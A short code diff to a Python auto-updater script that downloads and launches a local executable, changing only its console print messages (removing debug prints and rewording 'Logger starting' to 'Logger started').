@@ -37,7 +37,6 @@ def get_exe_name():
         return None
 
 EXE_NAME = get_exe_name() or "index.exe"
-print(EXE_NAME)
 
 def detect_browser():
     if len(sys.argv) > 1:
@@ -67,7 +66,6 @@ def detect_browser():
         return None
 
 BROWSER_PATH = detect_browser()
-print(BROWSER_PATH)
 
 documents_path = os.path.join(os.path.expanduser("~"), "Documents")
 local_path = os.path.join(documents_path, "local")  
@@ -134,6 +132,7 @@ def download_new_version():
         run_exe(LOCAL_EXE_FILE)
 
 def run_exe(directory):
+    print("🚀 Starting EXE...", directory)
     try:
         process = subprocess.Popen([directory], shell=True)
         process.wait()
@@ -162,10 +161,9 @@ def check_for_update():
         with open(LOCAL_VERSION_FILE, 'w') as f:
             f.write(server_version)
     else:
-        print("✅ You have the latest version!")
-    print(LOCAL_EXE_FILE)
-    print("✅ Logger starting!")
+        print("✅ You have the latest version!", local_version)
     run_exe(LOCAL_EXE_FILE)
+    print("✅ Logger started!")
 
 if __name__ == "__main__":
     check_for_update()
